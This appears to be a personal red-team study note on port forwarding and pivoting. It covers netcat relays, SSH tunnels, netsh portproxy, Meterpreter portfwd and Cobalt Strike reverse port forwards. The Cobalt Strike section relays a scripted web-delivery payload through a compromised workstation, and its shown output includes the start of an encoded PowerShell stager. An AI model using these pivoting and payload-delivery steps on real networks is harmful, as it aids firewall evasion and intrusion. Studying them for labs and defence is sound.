---
creation date: September 24th 2022
last modified date: September 24th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Port Forwards]]  
___

## Description:  

### chisel
[[chisel]]

### Local Port Forwards

Linux:
This is how you can pivot to another port on the machine to get around firewalls.
```
mkfifo /tmp/backpipe
nc -nlvp8080 0</tmp/backpipe | nc -v 127.0.0.1 80 1>/tmp/backpipe
```

or you can do this with ssh
```
ssh -g -L 8001:localhost:8000 -N user@remote-server.com
```
This forwards the local port 8001 on your workstation to the localhost address on remote-server.com port 8000.



### Reverse Port Forwards

### Powershell

The native `netsh` (short for Network Shell) utility allows you to view and configure various networking components on a machine, including the firewall.  There's a subset of commands called `interface portproxy` which can proxy both IPv4 and IPv6 traffic between networks.

The syntax to add a **v4tov4** proxy is:

```
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
```

-   **listenaddress** is the IP address to listen on (probably always 0.0.0.0).
-   **listenport** is the port to listen on.
-   **connectaddress** is the destination IP address.
-   **connectport** is the destination port.
-   **protocol** to use (always TCP).

on the relay,  create a portproxy that will listen on 4444 and forward the traffic to the target, also on 4444.

```
C:\>netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.14.55 connectport=4444 protocol=tcp
```
you can check it's there with `netsh interface portproxy show`.


Now from your host, instead of trying to connect to the target, connect to the portproxy relay
```
PS C:\> Test-NetConnection -ComputerName 10.10.17.71 -Port 4444

ComputerName     : 10.10.17.71
RemoteAddress    : 10.10.17.71
RemotePort       : 4444
InterfaceAlias   : Ethernet
SourceAddress    : 10.10.15.75
TcpTestSucceeded : True
```

To remove the portproxy:
```
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```

### CobaltStrike

### rportfwd Command


In many corporate environments, workstations are able to browse the Internet on ports 80 and 443, but servers have no direct outbound access (because why do they need it?).

Let's imagine that we already have foothold access to a workstation and have a means of moving laterally to a server - we need to deliver a payload to it but it doesn't have Internet access to pull it from our Team Server. We can use the workstation foothold as a relay point between our webserver and the target.

Host a scripted web delivery payload and then attemp to download it from the server

```
PS C:\> hostname
dc-2

PS C:\> iwr -Uri http://10.10.5.120/a
iwr : Unable to connect to the remote server
```

You don't need to be a local admin to create reverse port forwards on high ports.

The syntax for the `rportfwd` command is `rportfwd [bind port] [forward host] [forward port]`. On the workstation (forward host and port should point to your payload on the team server):

```
beacon> rportfwd 8080 10.10.5.120 80
[+] started reverse port forward on 8080 to 10.10.5.120:80
```

This will bind port **8080** on the foothold machine, which we can see with **netstat**.

```
beacon> run netstat -anp tcp

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING
```

Now any traffic hitting this port will be redirected to **10.10.5.120** on port **80**. On the server, instead of trying to hit **10.10.5.120:80**, we use **10.10.17.231:8080** (where 10.10.17.231 is the IP address of the workstation).
```
PS C:\> iwr -Uri http://10.10.17.231:8080/a

StatusCode        : 200
StatusDescription : OK
Content           : $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sIAAAAAAAAAOy9Wa/qSrIu+rzrV8yHLa21xNo
                    1wIAxR9rSNTYY444eTJ1SyRjjBtw3YM49//1GZBoGY865VtXW1rkPV3dKUwyMnU1kNF9EZoRXTvEfqyLz7UKLT863/9g6We7H0T
                    fm...
```

To stop the reverse port forward, do `rportfwd stop 8080` from within the Beacon or click the **Stop** button in the **Proxy Pivots** view.


### rportfwd_local

Beacon also has a `rportfwd_local` command.  Whereas `rportfwd` will tunnel traffic to the Team Server, `rportfwd_local` will tunnel the traffic to the machine running the Cobalt Strike client.

This is particularly useful in scenarios where you want traffic to hit tools running on your local system, rather than the Team Server.

Take this Python http server as an example, whilst running the CS client on Kali:


```
root@kali:~# echo "This is a test" > test.txt
root@kali:~# python3 -m http.server --bind 127.0.0.1 8080
Serving HTTP on 127.0.0.1 port 8080 (http://127.0.0.1:8080/)
```
```
beacon> rportfwd_local 8080 127.0.0.1 8080
[+] started reverse port forward on 8080 to rasta -> 127.0.0.1:8080
```

This will bind port 8080 on the machine running the Beacon and will tunnel the traffic to port 8080 of the localhost running the Cobalt Strike client.

Then on another machine in the network, try to download the file.

```
PS C:\> hostname
wkstn-2

PS C:\> iwr -Uri http://wkstn-1:8080/test.txt

StatusCode : 200
StatusDescription : OK
Content : This is a test

```

### Metasploit

^651985

```
meterpreter > portfwd -h
meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.1.110
kali@kali:~$ rdesktop 127.0.0.1
```
Use 127.0.0.1 for local port forwards

### ssh

ssh user@ip –D 9050     (sets up dynamic port forward)

`sudo vim /etc/proxychains4.conf
`socks4 127.0.0.1 9050

It's better to point at local host when scanning:
`proxychains -q nmap –flags <target_ip> 

This will route all nmap traffic through the socks proxy on the port that is configured in proxychains, this port needs to be the same as used in `–D <port>` on the ssh declaration. Use -q for quite. Scanning is not the best through proxychains and only tcp traffic will work.

To setup in the browser download foxy proxy. Use a socks4 proxy type, use 127.0.0.1 as the IP, and the port to 9050 (or whatever you set).

To use browser with Burp, set the Browser to the burp proxy and then set burp to use the ssh proxy by editing the SOCKS proxy in the user settings.


___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 24th 2022 (09:49 am)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
